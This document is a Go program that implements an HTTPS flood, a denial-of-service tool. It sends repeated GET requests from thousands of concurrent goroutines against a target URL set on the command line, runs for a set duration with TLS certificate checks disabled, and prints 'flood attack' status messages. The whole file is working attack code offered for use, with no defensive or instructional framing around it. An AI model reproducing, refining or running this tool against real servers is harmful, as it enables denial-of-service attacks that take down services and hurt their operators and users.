package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"syscall"
	"time"
)

// Function to perform HTTPS flood attack
func httpsFlood(target string, end time.Time, wg *sync.WaitGroup, jobs <-chan struct{}) {
	defer wg.Done()
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		fmt.Printf("Failed to create request: %v", err)
		return
	}

	for range jobs {
		if time.Now().After(end) {
			return
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Failed to send request: %v", err)
			continue
		}
		_, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Failed to read response body: %v", err)
		}
		resp.Body.Close()
	}
}

func main() {
	// Command-line flags for user input
	target := flag.String("target", "https://127.0.0.1", "Target URL")
	duration := flag.Int("duration", 60, "Duration of the attack in seconds")
	workers := flag.Int("workers", runtime.NumCPU()*1000, "Number of concurrent workers")
	method := flag.String("method", "https", "Attack method: https")
	flag.Parse()

	// Print attack details
	fmt.Printf("Starting %s flood attack on %s for %d seconds with %d workers", *method, *target, *duration, *workers)

	// Handle graceful shutdown
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-quit
		fmt.Println("Attack stopped.")
		os.Exit(0)
	}()

	// Calculate attack end time
	end := time.Now().Add(time.Duration(*duration) * time.Second)

	// Channel to manage jobs
	jobs := make(chan struct{}, *workers)

	// WaitGroup to manage goroutines
	var wg sync.WaitGroup

	// Launch multiple goroutines for concurrent connections
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go httpsFlood(*target, end, &wg, jobs)
	}

	// Fill the jobs channel to keep workers busy
	go func() {
		for {
			if time.Now().After(end) {
				close(jobs)
				return
			}
			jobs <- struct{}{}
		}
	}()

	// Wait for all goroutines to finish
	wg.Wait()
	fmt.Println("Attack completed.")
}
